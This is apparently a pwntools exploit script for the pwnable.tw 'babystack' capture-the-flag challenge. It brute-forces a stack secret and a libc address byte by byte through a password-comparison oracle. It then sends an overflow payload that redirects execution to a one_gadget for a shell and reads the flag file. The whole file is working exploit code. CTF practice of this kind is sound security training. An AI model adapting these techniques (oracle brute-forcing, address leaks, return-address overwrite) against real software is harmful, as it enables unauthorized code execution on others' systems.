from pwn import *
def cmd(c):
	p.sendafter(">> ",c)
def cmp(payload):
	cmd("1\n")
	p.sendafter("owrd :",'{}\x00'.format(payload))
	res=p.readline()
	return res
p=process("./babystack",env={'LD_PRELOAD':'./libc_64.so.6'})
#p=remote("chall.pwnable.tw",10205)
#context.log_level='debug'
sec=""

for y in range(0x10):
	for x in range(1,256):
		if "Success" in cmp(sec+chr(x)):
			cmd("1\n")
			sec+=chr(x)
			break
log.success("====PartI Finished====")
pay="\x00"
pay=pay.ljust(0x48,'\xaa')
cmd("1\n")
p.sendafter("owrd :",'{}'.format(pay))
cmd("3\n")
p.sendafter("Copy :","A"*0x3f)
# now we can burp the libc_base
nier='\xaa'*8
cmd("1\n")
for y in range(0x6):
	for x in range(1,256):
		if "Success" in cmp(nier+chr(x)):
			cmd("1\n")
			nier+=chr(x)
			break
base=u64(nier[8:].ljust(8,'\x00'))-(0x7ffff7a85439-0x00007ffff7a0d000)
log.warning(hex(base))
log.success("====PartII Finished====")

pay='\x00'+'\xdd'*0x3f+sec+p64(0xdeadbeefdeadbeef)+"\xDD"*0x10+p64(base+0x45216)
pay=pay.ljust(0x7f,'\xaa')
cmd("1\n")
p.sendafter("owrd :",'{}'.format(pay))
cmd("3\n")
p.sendafter("Copy :","A"*0x3f)
#gdb.attach(p,'b * 0x000000000000EBB+0x0000555555554000')
#0x7fffffffde50 sec
cmd("2\n")
log.success("====Pwned====")
p.sendline("cat /home/babystack/flag")
p.interactive()
#0x7fffffffdd80
